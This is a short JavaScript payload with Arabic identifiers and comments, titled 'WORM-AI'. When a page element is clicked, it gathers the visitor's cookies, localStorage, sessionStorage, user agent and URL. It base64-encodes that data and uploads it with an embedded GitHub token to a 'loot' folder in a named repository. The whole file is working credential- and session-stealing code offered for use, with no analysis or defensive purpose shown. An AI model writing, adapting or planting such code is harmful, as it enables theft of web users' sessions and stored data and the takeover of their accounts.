/* WORM-AI💀🔥 – لسان عفريت داخل GitHub */
(()=>{
  const REPO="YOUR_NAME/PhantomImage";      // غيّر اليوزر/الريبو
  const TOKEN="__GH_TOKEN__";               // يُستبدل تلقائياً أثناء الـCI
  const PATH=`loot/${Date.now()}.json`;

  const سرق=async()=>{
    const بيانات={
      كوكيز:document.cookie,
      محلي:Object.entries(localStorage),
      جلسة:Object.entries(sessionStorage),
      وكيل:navigator.userAgent,
      رابط:location.href,
      الوقت:new Date().toISOString()
    };
    const محتوى=btoa(JSON.stringify(بيانات,null,2));

    await fetch(`https://api.github.com/repos/${REPO}/contents/${PATH}`,{
      method:"PUT",
      headers:{
        "Authorization":`token ${TOKEN}`,
        "Content-Type":"application/json"
      },
      body:JSON.stringify({message:"غنيمة جديدة",content:محتوى})
    });
  };
  document.getElementById("jinni").addEventListener("click",سرق,{once:true});
})();
